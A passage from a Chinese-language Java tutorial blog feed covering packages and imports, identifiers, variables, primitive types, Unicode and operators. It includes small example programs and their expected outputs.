<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SubClass;         <span class="keyword">package</span> MyClass.SubClass;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s1</span></span>&#123;                 <span class="class"><span class="keyword">class</span> <span class="title">s2</span></span>&#123;</span><br><span class="line">……                        ……</span><br><span class="line"> &#125;                         &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-包的引用"><a href="#2-3-包的引用" class="headerlink" title="2.3  包的引用"></a><font color="#20B2AA" face="Comic sans MS">2.3  包的引用</font></h4><p><font face="Comic sans MS"><strong>1. 📒使用全名引用：</strong><br>&amp;emsp;(1) 同包的类相互引用时：<br>&amp;emsp;&amp;emsp;&amp;emsp;      <font color="red">在使用的属性或方法名前加上类名作为前缀即可.</font><br>&amp;emsp;(2) 不同包中的类相互引用时：<br>&amp;emsp;&amp;emsp;&amp;emsp;      <font color="red">在类名的前面再加上包名——类的全名.</font><br>&amp;emsp;&amp;emsp;&amp;emsp;      例如：Class myDate extends java.util.Date{<br>&amp;emsp;&amp;emsp;&amp;emsp;      java.util.Date d&#x3D;new java.util.Date();<br>&amp;emsp;&amp;emsp;&amp;emsp;      ……<br>&amp;emsp;&amp;emsp;&amp;emsp;       }</p>
<p><strong>2. 📒使用import：</strong><br>&amp;emsp;&amp;emsp;import可以加载整个包中的文件或包中的某一个文件。import语句的格式为：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;<font color="#00B2EE">import package1[.package2…].(classname|*);</font><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDate</span> <span class="keyword">extends</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">         Date d=<span class="keyword">new</span> Date();</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red" face="Comic sans MS"><strong>注意：java编译器会为所有程序自动引入包java.lang，因此不必用import语句引入它包含的所有的类，但是若需要使用其他包中的类，必须用import语句引入。</strong></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-4-编译和运行包中的类"><a href="#2-4-编译和运行包中的类" class="headerlink" title="2.4  编译和运行包中的类"></a><font color="#20B2AA" face="Comic sans MS">2.4  编译和运行包中的类</font></h4><p><font face="Comic sans MS">当程序中用package语句指明一个包，在编译时产生的字节码文件（.class文件）需要放到相应的以包名为名称的文件夹目录下：<br>   （1）手工建立子目录，以包名命名该目录，再将.class文件复制到相应目录下。<br>   （2）在编译时，使用“javac –d”命令<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-Java包"><a href="#2-5-Java包" class="headerlink" title="2.5  Java包"></a><font color="#20B2AA" face="Comic sans MS">2.5  Java包</font></h4><p><font face="Comic sans MS">&amp;emsp;&amp;emsp;Java自带了一些包。这些包以“java.”开头，作为java的一个标准部分发布。学习Java，必须学习Java常用包中的类。从第六章开始，主要内容是介绍Java常用包的使用。</p>
<p><a href="https://www.breakyizhan.com/java/4260.html">包的使用参考。</a><br><a href="https://www.breakyizhan.com/java/4313.html">输入流的使用参考。</a><br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java语言基础的字符常变量等(3.1-3.3)</title>
    <url>/post/Java-Language-2-1/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>标识符,注释和分隔符、变量和常量、基本类型</font></center>
&ensp;
&ensp;

<h4 id="一、-标识符、注释和分隔符"><a href="#一、-标识符、注释和分隔符" class="headerlink" title="一、 标识符、注释和分隔符"></a><font color="#FF6347" face="Comic sans MS">一、 标识符、注释和分隔符</font></h4><p><font color="red" face="Arial">📒标识符：</font><font face="Arial">是程序员用来标记语言中元素（变量、常量、类、对象等）名称的命名记号。</font></p>
<table><tr><td bgcolor=#B0E0E6>Java中的标识符遵守先定义后使用的原则。即只有定义了的标识符，才可在语句部分使用。</td></tr></table>

<p><font color="#EE7942" face="Arial"><strong>Java定义标识符的规则：</strong></font><br>(1)由字母、 数字、下划线、$组成，不能由数字开头<br>(2)不能是Java中的保留字(关键字)；<br>(3)大小写敏感，长度无限制。</p>
<p>&amp;emsp;</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>保留字</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">类型保留字</font></td>
<td><font face="Comic sans MS" color="#EE3A8C"> boolean, byte, char, short,  int, long,float, double, void</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">语句保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> if, else, switch, case, default, break, for, while, do,return,continue,try,catch,finally,throw,synchronized</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">表达式保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> new, null, this, super</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">修饰符保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> abstract, final, public, private, protected, static, transient, volatile </font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">类、方法保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> class, throws, native, instanceof</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">扩展类构筑模块保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> package, import, extends, implements, interface<font face="Comic sans MS" color="#EE3A8C"></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">其它保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> cast, futuer, generic, inner, oprater, outer, rest,var<font face="Comic sans MS"></td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="1-1-标识符"><a href="#1-1-标识符" class="headerlink" title="1.1  标识符"></a><font color="#3CB371" face="Comic sans MS">1.1  标识符</font></h5><table><tr><td bgcolor=#ADD8E6><font color=""  face="Comic sans MS">**举例**：
合法标识符：     A , a1,  $Systembol,  square,  ex_sa
不合法标识符：          1a          （以数字1开头）
                       break       （禁止使用保留字）
                       TWO  WORDS  （含有空格）
                       .NO         （有圆点）
</font></td></tr></table>


<p>&amp;emsp;</p>
<h5 id="1-2-注释"><a href="#1-2-注释" class="headerlink" title="1.2  注释"></a><font color="#3CB371" face="Comic sans MS">1.2  注释</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**Java有三种注释形式：**
      1.“//” 单行注释。表示从此向后，直到行尾都是注释。
      2.“/\*……\*/“ 块注释。在“/\*”和“\*/”之间都是注释。
      3.“/\*\*……\*/”文档注释。所有在“/\*\*”和“\*/”之间的内容可以用来自动形成文档。</font></td></tr></table>


<p>&amp;emsp;</p>
<h5 id="1-3-语句"><a href="#1-3-语句" class="headerlink" title="1.3  语句"></a><font color="#3CB371" face="Comic sans MS">1.3  语句</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">与C++一样，Java中的语句也是最小的执行单位。
&emsp;&emsp;&emsp;&emsp;各个语句之间以  ;  间隔
&emsp;&emsp;&emsp;&emsp;X大括号{   }内的一系列语句称为语句块</font></td></tr></table>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="二、-变量和常量"><a href="#二、-变量和常量" class="headerlink" title=" 二、 变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 二、 变量和常量</font></h4><h5 id="2-1-变量"><a href="#2-1-变量" class="headerlink" title="2.1  变量"></a><font color="#3CB371" face="Comic sans MS">2.1  变量</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">📒Java的变量有两种：<font color="red">**局部变量  类成员变量**</font>
变量必须先定义后使用！变量的定义形式如下：
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<font color="red">类型      变量名表；</font></font></td></tr></table>

<blockquote>
<p>注意：局部变量在使用前必须给定初值，否则，将编译出错，而类成员变量无此要求。</p>
</blockquote>
<p><font face="Comic sans MS">如下出现编译错误，缺少“y&#x3D;8;”</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">  int x;</span><br><span class="line">  void <span class="function"><span class="title">method</span></span>()&#123;</span><br><span class="line">      int y; </span><br><span class="line">      System.out.println(x)</span><br><span class="line">      System.out.println(y);&#125;</span><br><span class="line">  public static void main(String[] args)&#123;</span><br><span class="line">       <span class="built_in">test</span> t=new <span class="built_in">test</span>();</span><br><span class="line">       t.method();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h6 id="2-1-1-变量名"><a href="#2-1-1-变量名" class="headerlink" title="2.1.1  变量名 "></a><font color="#3CB371" face="Comic sans MS">2.1.1  变量名 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1. 📒在Java中用标识符来表示变量名**。
&emsp;&emsp;1.1 变量名中字母大写和小写是有区别的，如name和Name表示两个不同的变量名；
&emsp;&emsp;1.2 变量名标志存放变量值的内存位置，其内存存放的内容是变量的值。
**2. 📒命名方法**:
2.1 程序员应该为变量取有意义的名称，以利于程序的阅读和理解；
2.2 习惯上，变量名以小写字母开头，若一个变量名由超过一个单词所组成，则第一个单词之后的所有单词都以大写字母开头，以便于理解该变量名。
&emsp;&emsp;例如，anIntVar
</font></font></td></tr></table>

<p>&amp;emsp;</p>
<h6 id="2-1-2-变量的类型"><a href="#2-1-2-变量的类型" class="headerlink" title="2.1.2   变量的类型 "></a><font color="#3CB371" face="Comic sans MS">2.1.2   变量的类型 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**变量类型用于表述数据的格式和结构。**
📒**Java中的数据类型可分为两大类：**
<font color="red">**基本数据类型：**</font>整数类型、实数类型、字符型、布尔型          
<font color="red">**构造数据类型：**</font>Java 语言中构造类型用类来描述。
</font></font></td></tr></table>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="三、-基本数据类型表-变量和常量"><a href="#三、-基本数据类型表-变量和常量" class="headerlink" title=" 三、 基本数据类型表:变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 三、 基本数据类型表:变量和常量</font></h4><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1nnP.png" alt="1"></p>
<p>&amp;emsp;</p>
<h5 id="3-1-整型"><a href="#3-1-整型" class="headerlink" title="3.1  整型"></a><font color="#3CB371" face="Comic sans MS">3.1  整型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr10NF.png" alt="2"></p>
<p>&amp;emsp;</p>
<h6 id="3-1-1-整型常量"><a href="#3-1-1-整型常量" class="headerlink" title="3.1.1  整型常量"></a><font color="#3CB371" face="Comic sans MS">3.1.1  整型常量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1jUS.png" alt="3"></p>
<p>&amp;emsp;</p>
<h6 id="3-1-2-整型变量"><a href="#3-1-2-整型变量" class="headerlink" title="3.1.2  整型变量"></a><font color="#3CB371" face="Comic sans MS">3.1.2  整型变量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3S3j.png" alt="4"></p>
<p>&amp;emsp;</p>
<h5 id="3-2-实型"><a href="#3-2-实型" class="headerlink" title="3.2  实型"></a><font color="#3CB371" face="Comic sans MS">3.2  实型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3uvR.png" alt="5"></p>
<p>&amp;emsp;</p>
<h6 id="3-2-1实型常量有两种表示法："><a href="#3-2-1实型常量有两种表示法：" class="headerlink" title="3.2.1实型常量有两种表示法："></a><font color="#3CB371" face="Comic sans MS">3.2.1实型常量有两种表示法：</h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1)十进制表示法**
&emsp;&emsp;-3.5f&emsp;0.0f&emsp;123.45f&emsp;+678.9f
      要注意,采用十进制表示法时,小数点的两侧都必须有数字, 缺一不可，如+123．和 .56都是不合法的。
**(2)科学表示法：** <font face="Comic sans MS" color="red">**<尾数> E <阶码 > **</font>
&emsp;&emsp;-1.234567E+12&emsp;(-1.2345678901×1012)
&emsp;&emsp;尾数&emsp;阶码
**注意：**<font color="red">
&emsp;&emsp;&emsp;&emsp;尾数必须有，但小数部分可无；
&emsp;&emsp;&emsp;&emsp;阶码必须有，必须是整数。
&emsp;&emsp;&emsp;&emsp;基数是10
</font></font></td></tr></table>        
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**下列表示都是不正确的。**
&emsp;&emsp;E-6&emsp;&emsp;（缺尾数）
&emsp;&emsp;3E&emsp;&emsp;（无阶码）
&emsp;&emsp;2.E3&emsp;&emsp;（尾数出错）
&emsp;&emsp;2E1.2&emsp;&emsp;（阶码非整数）
&emsp;
**📒实型变量的定义**
例如：
float aFloatVar;
double aDoubleVar;<font>
</font></font></td></tr></table>

<p>&amp;emsp;</p>
<h5 id="3-3-布尔型"><a href="#3-3-布尔型" class="headerlink" title="3.3      布尔型"></a><font color="#3CB371" face="Comic sans MS">3.3      布尔型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒布尔数据类型用于表达逻辑状态：**
&emsp;&emsp;布尔型数据只有两个值：true和false。
&emsp;&emsp;<font face="Comic sans MS" color="red">**注意: Java中不可将布尔类型看做整型值。true不对应1，false不对应0，不像C++一样。**</font></font></font></td></tr></table>

<p>&amp;emsp;</p>
<h5 id="3-4-字符型"><a href="#3-4-字符型" class="headerlink" title="3.4      字符型"></a><font color="#3CB371" face="Comic sans MS">3.4      字符型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒字符类型用来表示单个字符，采用16位二进制Unicode 编码表示**
字符常量是用两个单引号括起来的一个字符
&emsp;&emsp;例如： 'A'；  'a'； '2'； '我'；
也可用unicode代码表示一个字符常量
&emsp;&emsp;例如： '\u0041'
</font></font></td></tr></table>    

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="四、-Unicode编码"><a href="#四、-Unicode编码" class="headerlink" title=" 四、 Unicode编码"></a><font color="#FF6347" face="Comic sans MS"> 四、 Unicode编码</font></h4><table><tr><td bgcolor=#EEE0E5><font face="Comic sans MS">**📒Unicode编码：**
1. Java的字符使用Unicode编码，使用两个字节(16位)，所以它几乎包括所有字符，中文、日文、…，它支持世
   界上所有语言。  
2. 大多数语言使用ASCII码，用8位表示一个字符。ASCII码是Unicode码的一个子集，Unicode表示ASCII
   码时，其高位为0，它是其前255个字符。Unicode字符通常用十六进制。例如“\u0000”-“\u00ff”表示
   ASCII码集。”\u”表示转义字符，它用来表示其后四个十六进制数字是Unicode代码。
</font></font></td></tr></table> 

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java运算符和数据类型转换(3.4-3.6)</title>
    <url>/post/Java-Language-2-2/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>运算符及表达式、运算符的优先级、数据类型转换</font></center>

<ul>
<li><input disabled="" type="checkbox"> <strong>3.4-3.6学习知识点</strong><ul>
<li><input disabled="" type="checkbox"> 运算符及表达式<ul>
<li><input disabled="" type="checkbox"> 算术运算符</li>
<li><input disabled="" type="checkbox"> 关系运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
<li><input disabled="" type="checkbox"> 位运算符</li>
<li><input disabled="" type="checkbox"> 赋值运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> 运算符的优先级</li>
<li><input disabled="" type="checkbox"> 数据类型转换<ul>
<li><input disabled="" type="checkbox"> 自动类型转换</li>
<li><input disabled="" type="checkbox"> 手动强制类型转换</li>
<li><input disabled="" type="checkbox"> 隐含强制类型转换</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>&amp;ensp;<br>&amp;ensp;</p>
<h3 id="一、-运算符及表达式"><a href="#一、-运算符及表达式" class="headerlink" title="一、 运算符及表达式 "></a><font color="#FF6347" face="Comic sans MS">一、 运算符及表达式 </font></h3><p><font face="Comic sans MS">&amp;emsp;Java可以对各种类型的数据进行加工，这种加工过程称为<font color="#00B2EE"><strong>运算</strong></font> 。其中表示各种不同运算的符号称为<font color="#00B2EE"><strong>运算符</strong></font> ，参与运算的数据称为<font color="#00B2EE"><strong>操作数</strong></font> 。操作数和运算符按一定语法形式组成的符号序列称为表达式。每个表达式经过运算后都会产生一个确定的值。<br></font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒运算符按其功能分为七类：**</font>
1. 算术运算符  + 、-、 \*、 /、%、 ++、 --
2. 关系运算符  > 、<、 >=、 <=、 ==、 !=
3. 逻辑运算符  ！、&&、||、&、|
4. 位运算符     >>、<<、>>>、&、|、^、~
5. 条件运算符  ？：
6. 赋值运算符  =、+=、-= 、\*= 、/=
7. 其他：下标运算符[]

<p><font color="red"><strong>📒运算符按其要求的操作数个数分为三种：</strong></font></p>
<ol>
<li>一元运算符  如  ++、–</li>
<li>二元运算符  如  +、-、*、&#x2F;、%(求模)</li>
<li>三元运算符  如  ？：<br></font></td></tr></table></li>
</ol>
<hr>
<hr>
<p>&amp;emsp;</p>
<h4 id="1-1-算术运算符"><a href="#1-1-算术运算符" class="headerlink" title="1.1  算术运算符"></a><font color="#3CB371" face="Comic sans MS">1.1  算术运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的单目运算符**</font>
          如   +（一元加，取正值）、
               -（一元减，取负值）、
               ++ （增1运算符）、\-\- （减1运算符）

<p><strong>增1运算符(++)和减1运算符(--)：</strong><br>   只能用于变量，而不能用于常量或表达式。增量运算符和减量运算符的功能是将操作数的值加1或减1.</p>
<p>(1)<font color="red">增1运算符（减1运算符）在操作数的<strong>前面</strong>，</font>首先对操作数本身进行增减1运算，然后再参与其所在表达式的<br>  运算。<br>例：如果变量a的值为5，求下列表达式及a的值<br>      ① ++a +10<br>          表达式的值为16，a变为6<br>      ② --a +10<br>          表达式的值为14，a变为4<br>(2)<font color="red">增1运算符（减1运算符）在操作数的<strong>后面</strong>，</font>则首先让操作数参与计算整个表达式的值，然后再对操作数进行<br>   增减运算<br>  例：如果变量a的值为5，求下列表达式及a的值<br>            ① a++ +10<br>                   表达式的值为15，a变为6<br>            ② a-- +10<br>                   表达式的值为15，a变为4<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">练习题1：写出该程序的输出结果</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">           int a=5;</span><br><span class="line">           System.out.println(++a);</span><br><span class="line">           System.out.println(--a);</span><br><span class="line">           System.out.println(a++);</span><br><span class="line">           System.out.println(a--);</span><br><span class="line">&#125; </span><br><span class="line">&#125;                        </span><br><span class="line">输出结果：</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的双目运算符 **</font>       
 如     +（加）、-（减）、\*（乘）、/（除）、  % （取余数或取模）。
       +，-，\* 是通常意义的加、减、乘
如果整数相除，则结果取整。如 5/2 得到结果2。    
如果浮点数相除，则是我们通常意义上的除法，如5.0/2.0结果为2.5。
%是取余，如 5%2结果为1
                         5.2%2结果为1.2
                         5.2%2.2结果为0.8 
                         10%-4结果2； -10%-4结果-2 

<p><font color="red"><strong>注意：</strong></font> 如果整数相除或取模 第二个操作数为0 编译无错 运行会出错 抛出异常；<br>          如果浮点数相除或取模 第二个操作数为0 结果为NaN 。<br>注意：</p>
<ol>
<li>整数    int a&#x3D;10&#x2F;0     运行报错<br>         int a&#x3D;10%0   运行报错</li>
<li>浮点数<br>  double a&#x3D;10.0&#x2F;0     Infinity(正无穷大)<br>  double a&#x3D;-10.0&#x2F;0   -Infinity（负无穷大）<br>  double a&#x3D;0.0&#x2F;0        NaN<br>  double a&#x3D;0.0%0        NaN<br></font></td></tr></table></li>
</ol>
<blockquote>
<blockquote>
<p><strong>思考：</strong>某个培训中心要为新到的学员安排房间，假设共有x个学员，每个房间可以住6人，让你用一个公式来计算他们要住的房间数？<br>答案：  (x+5)&#x2F;6<br>这也可以用于计算留言板的页数。 </p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-关系运算符"><a href="#1-2-关系运算符" class="headerlink" title="1.2  关系运算符"></a><font color="#3CB371" face="Comic sans MS">1.2  关系运算符</font></h4><font face="Comic sans MS">
<font color="#00B2EE">**1.关系运算符有七种：**</font>== ，!= ，< ,<= , > ,>= , instanceof  (对象运算符)
<font color="#00B2EE">**2.关系表达式的结果类型为布尔型**</font>
<font color="#00B2EE">**3.instanceof：**</font>用来确定一对象是否是某一指定类的对象</font>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> class <span class="built_in">test</span></span><br><span class="line">&#123;    public static void main(String args[])</span><br><span class="line">     &#123;    <span class="built_in">test</span> t1=new <span class="built_in">test</span>();</span><br><span class="line">          <span class="keyword">if</span>(t1 instanceof <span class="built_in">test</span>)&#123; System.out.println(<span class="string">&quot;是&quot;</span>);&#125;    </span><br><span class="line">     &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red" face="Comic sans MS"><strong>📒关系表达式</strong></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3864c7165e7.png" alt="1.png"></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-逻辑运算符"><a href="#1-3-逻辑运算符" class="headerlink" title="1.3  逻辑运算符"></a><font color="#3CB371" face="Comic sans MS">1.3  逻辑运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c3866ddb16bb.png" alt="2.png"> <img data-src="https://i.loli.net/2019/01/11/5c38674613277.png" alt="3.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">class <span class="built_in">test</span>&#123;    </span><br><span class="line">	public static void main(String args[])&#123; </span><br><span class="line">		boolean s;int i=100;</span><br><span class="line">		s=(3&gt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">		i=100;</span><br><span class="line">		s=(3&lt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">输出结果：</span><br><span class="line">101</span><br><span class="line">100</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-位运算符"><a href="#1-4-位运算符" class="headerlink" title="1.4  位运算符"></a><font color="#3CB371" face="Comic sans MS">1.4  位运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c386923e4c7a.png" alt="4.png"><img data-src="https://i.loli.net/2019/01/11/5c38692468530.png" alt="5.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">int a=7, b=8, c;</span><br><span class="line">	c = a &amp; b;     //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a | b;     //c=00000000000000000000000000001111=15</span><br><span class="line">	c = a ^ b;     //c=00000000000000000000000000001111=15</span><br><span class="line">    c =~a;         //c=11111111111111111111111111111000=-8</span><br><span class="line"></span><br><span class="line">例：分析下列程序的输出结果</span><br><span class="line">    int a=7,c;     //a=00000000000000000000000000000111</span><br><span class="line">	c = a&gt;&gt;3;      //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a &lt;&lt; <span class="string">3;    //c=00000000000000000000000000111000=56</span></span><br><span class="line"><span class="string">	c = a &gt;&gt;&gt; 3</span>;   //c=00000000000000000000000000000000=0</span><br><span class="line">int a =-8; </span><br><span class="line">System.out.println(a&gt;&gt;&gt;1) //结果2147483644</span><br><span class="line">int i=88&gt;&gt;32; System.out.println(i)  //结果88</span><br><span class="line">//（在进行移位之前，java系统首先把移的位数与被移位数求余数，然后移动这个位数）</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font><br>（1）右移n位后的结果与除以2的n次方效果相同<br>（2）左移n位后的结果与乘以2的n次方效果相同<br>（3）无符号右移要慎重<br></font></p>
<blockquote>
<blockquote>
<p>思考：  如何用一个表达式计算2的X次方？<br>答案：  1&lt;&lt;x<br>将1左移x位 </p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-赋值运算符"><a href="#1-5-赋值运算符" class="headerlink" title="1.5  赋值运算符"></a><font color="#3CB371" face="Comic sans MS">1.5  赋值运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**(1)简单赋值运算符    = **</font> 
将等号右边的表达式的值赋给等号左边的变量
       例如：     int c,d;
                     c=1;
                     d=c+10;
<font color="red">**(2)复合赋值运算符      +=、-=、*=、/=、%= 等**</font> 
一般形式为：   变量 op= 表达式
等价于:     变量 =变量 op 表达式
c += a;     //c = c +a;
c -= a;     //c = c -a;
c *= a;     //c = c * a;

<p>例：int a&#x3D;1;<br>        double x&#x3D;2;<br>        a+&#x3D;2;           &#x2F;&#x2F; 就是a&#x3D;a+2, 结果使a的值为3<br>        x*&#x3D;x+3;       &#x2F;&#x2F; 就是x&#x3D;x*(x+3), 结果使x的值为10.0<br>        int a&#x3D;b&#x3D;c&#x3D;d&#x3D;12;<br>        int a&#x3D;(b&#x3D;(c&#x3D;(d&#x3D;12))); &#x2F;&#x2F;赋值运算符有返回值，返回值是&#x3D;右边的值</p>
<p><font color="red"><strong>注意：</strong></font></p>
<ol>
<li>boolean型的只能赋给boolean型；</li>
<li>其他七种类型如果能自动转换则可直接赋值，否则要进行强制类型转换。<br></font></td></tr></table></li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-条件运算符"><a href="#1-6-条件运算符" class="headerlink" title="1.6  条件运算符"></a><font color="#3CB371" face="Comic sans MS">1.6  条件运算符</font></h4><p><font face="Comic sans MS">Java 中唯一的三元运算符，其格式如下：<br><font color="#00B2EE">&amp;emsp;&amp;emsp;<strong>变量 &#x3D;  &lt;布尔表达式&gt; ? &lt;表达式1&gt; : &lt;表达式2&gt;</strong></font><br>含义是：当&lt;布尔表达式&gt;为真时，变量的值为&lt;表达式1&gt;的值，否则为&lt;表达式2&gt;的值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例:  条件运算</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">            int x=20,y=30,max;</span><br><span class="line">            max = (x&gt;y) ? x : y;      </span><br><span class="line">            System.out.println(“max=”+max);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：max=30</span><br><span class="line"></span><br><span class="line">练习题2:</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">      int a=3,b=4,c;</span><br><span class="line">      c=a&gt;b? ++a:b++;</span><br><span class="line">      System.out.println(a+<span class="string">&quot;、&quot;</span>+b+<span class="string">&quot;、&quot;</span>+c);    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">3、5、4</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-运算符的优先级"><a href="#二、-运算符的优先级" class="headerlink" title="二、 运算符的优先级 "></a><font color="#FF6347" face="Comic sans MS">二、 运算符的优先级 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式的运算次序取决于表达式中各种运算符的优先级。</strong></font><br>     （1）优先级高的先运算，优先级低的后运算。<br>     （2）括号( )的优先级最高。<br>     （3）优先级相同的情况下要考虑结合性，即从左向右运算还是从右向左运算。<br><font color="#00B2EE"><strong>Java语言规定的运算符的优先级如下表所示</strong></font><br></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3871997c702.png" alt="6.png"></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算符的优先级与结合性的一些规律：**</font> 
1. 优先级
<font color="red">       () > 单目运算符 > 双目运算符 > 三目运算符 > 赋值运算符</font> 
双目： <font color="red">算术>关系>逻辑</font> 。
2. 结合性
<font color="red">大多数运算符结合性为从左至右
赋值运算符的结合性为从右至左</font> 
    int a,b=3,c=5;
    a = b = c;    //结果：a、b、c均为 5 

<p><font color="red"><strong>表达式写法的习惯：</strong></font> </p>
